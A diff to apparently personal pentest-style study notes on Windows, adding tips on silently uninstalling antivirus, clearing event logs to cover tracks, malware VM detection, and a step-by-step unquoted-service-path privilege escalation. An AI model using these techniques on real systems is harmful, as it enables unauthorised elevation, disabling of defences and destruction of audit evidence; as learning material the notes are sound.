@@ -2,24 +2,28 @@
 
 ## Table of Contents
 1. Windows and Associated Filesystems
-	1.1 Windows Basics(?)
-	1.2 File Allocation Table (FAT)
-	1.3 New Technology File System (NTFS)
-	1.4 Resilient File System (ReFS)
+	- 1.1 Windows Basics(?)
+	- 1.2 File Allocation Table (FAT)
+	- 1.3 New Technology File System (NTFS)
+	- 1.4 Resilient File System (ReFS)
 2. Additional Windows Tools
 3. Windows Command Prompt
-	3.1 Useful Commands
-	3.2 Basic Batch File Scripting
+	- 3.1 Useful Commands
+	- 3.2 Basic Batch File Scripting
 4. Windows Powershell
 5. Windows Registry
+	- 5.1 Overview
+	- 5.2 CLSID
+	- 5.3 Startup Program
+	- 5.4 Privilege Escalation Using Registry
 6. Communicating with Windows
-	6.1 A Possible Method
-	6.2 Powercat
-	6.3 Telnet
+	- 6.1 A Possible Method
+	- 6.2 Powercat
+	- 6.3 Telnet
 7. Windows Protection Mechanisms
-	7.1 DEP
-	7.2 ASLR
-	7.3 SEHOP
+	- 7.1 DEP
+	- 7.2 ASLR
+	- 7.3 SEHOP
 
 ### 0. Foreword
 This document serves as a quick overview of the different aspects of Microsoft Windows. It is by no means comprehensive nor extensive. It just aims to help you take home something new at the end of the document
@@ -34,6 +38,10 @@ Enabling **GodMode** - Simply create a folder (e.g. on the Desktop) and name it 
 Enabling **Bash Shell** - If you can't stand CMD/Powershell, you can enable the "Windows subsystem for Linux (Beta)" option in "Turn Windows Features on/off" too
 
 About **Telemetry** - Microsoft collects data from its users. One of the typical ways to go about disabling it is to go the the Group Policy Editor `gpedit.msc` and set the value of "AllowTelemetry" to 0 (i.e. Don't collect). However, it is always important to read the fine print:
+
+Locking Screen - Simply run `rundll32.exe user32.dll, LockWorkStation` to lock someone's computer (i.e. goes to the login screen)
+
+Running scripts - You can use `wscript.exe [SCRIPT JS/VBS]` or `cscript.exe [SCRIPT JS/VBS/C#]` in order to run scripts in different languages
 
 ![](img/telemetry-gpedit.png)
 
@@ -197,6 +205,12 @@ wmic useraccount list full
 
 wmic qfe list full
 - Displays a full list of patches and service packs installed on a service machine (Useful to determine if an exploit works) [qfe = Quick Fix Engineering]
+
+wmic product get name /value
+- Gets all software names
+
+wmic product where name="[NAME]" call uninstall /noiteractive
+- Uninstalls software without any interactive components. Useful for removing anti-virus etc.
 ```
 
 Invoking Useful GUIs using command line:
@@ -208,13 +222,28 @@ eventvwr.msc - Event Viewer
 regedit - Registry Editor
 ```
 
-Other Similar commands to Linux
+Windows Logging Features
+```bat
+wevtutil el
+- Get a list of logs for Windows Events
+
+wevtutil -cl [LOGNAME]
+- Clear a specific lop from Windows Events. Good for covering up your own tracks...
+```
+
+Other Commands
 ```bat
 whoami / echo %username%
 - shows login name of currently logged in user
 
 netstat -a -n 2
 - Displays all connections and listening ports (in decimal form), auto-refresh every 2 seconds
+
+systeminfo
+- Dumps a whole lot of content about the current OS (E.g. if you are malware writer, you would know you are inside a VM and simply not behave maliciously for dynamic analysis...)
+
+schtasks
+- Displays list of scheduled tasks (similar to cronjobs)
 ```
 
 Runnning as another user (similar to sudo)
@@ -284,6 +313,12 @@ The Windows Registry is a "central storehouse" for all settings on Windows opera
 - HKEY_USERS -> Contains program settings, desktop configuration etc. for all users
 - HKEY_CURRENT_CONFIG -> Contains information about hardware configuration
 
+In order to import a registry, we can store values inside a .REG file that states all the keys we want. We can also export Windows Registry to a .REG file too:
+```
+"<Value Name>"=<Value Type>:<Value Data>
+- E.g. "MyNewValue"=hex:FF
+```
+
 #### 5.2 CLSID
 We note that that there is a CLSID folder at `HKEY_CLASSES_ROOT\CLSID`, which contain subfolders looking something like `{018D5C66-4533-4307-9B53-224DE2ED1FE6}`. This (at least in Windows 10) represents the globally unique identifier (GUID) for programs and services. For example, we know that the GUID {018D5C66-4533-4307-9B53-224DE2ED1FE6} belong to Microsoft OneDrive:
 
@@ -299,7 +334,51 @@ brings up the Network connections folder on Windows 10. For a list of typical GU
 
 #### 5.3 Startup Programs
 
+If we want to determine which programs run at startup, we can search the following locations:
+```bat
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+```
 
+#### 5.4 Privilege Escalation Using Registry
+Privilege escalation is the act of exploiting bugs / design flaws / configuration problems to gain elevated access to resources normally protected from an application / user. Over here, we consider the case of unquoted service paths.
+
+We first attempt to find services that are automatically started that is not a core Windows service and doesn't contain quotes:
+```bat
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+```
+(Find services with "Auto" keyword in it without `"` or `C:\Windows\\`)
+
+Suppose it returns the following result:
+```
+MyVulnService                       	MyVulnService
+C:\Program Files (x86)\MyProgramFolder\MySubfolder\Executable.exe
+Auto
+```
+
+In that case, we know that `MyVulnService` may be exploited. Because it is unquoted i.e. not `"C:\Program Files (x86)\MyProgramFolder\MySubfolder\Executable.exe"`, Windows will check for the first .exe file it finds in the following order:
+```
+C:\Program.exe
+C:\Program Files.exe
+C:\Program Files (x86)\Program.exe
+C:\Program Files (x86)\MyProgramFolder\A.exe
+C:\Program Files (x86)\MyProgramFolder\MySubfolder\Executable.exe
+```
+This is due to the way [CreateProcess](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx) works in Windows OSes.
+
+Notice that if we put `A.exe` in MyProgramFolder, it will be executed before the original `Executable.exe` which is called by `MyVulnService`. The last thing to check is that we have permissions to that folder using the `icacls` tool:
+
+```bat
+icacls "C:\Program Files (x86)\MyProgramFolder"
+C:\Program Files (x86)\Program Folder Everyone:(OI)(CI)(F)
+                                      .....
+Successfully processed 1 files; Failed processing 0 files
+```
+(Note: `F` = full control, `OI` = object inherit (subfiles), `CI` = container inherit (subdirectories))
+
+Since we alredy know that `Everyone` has full control of that folder, then placing `A.exe` inside will allow `A.exe` to be run as SYSTEM. So if `A.exe` is a shell equivalent, we effectively gain "root access".
+
+A whole other list of possible attacks on different versions of Windows OS can be found [here](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
 
 ### 6. Communicating with Windows
 Very often, it is highly annoying to communicate with Windows on remote systems. One possible alternative is to try installing `netcat` and establishing a reverse (TCP) shell. That is, if we are targetting the windows system, we want it to connect back to us:
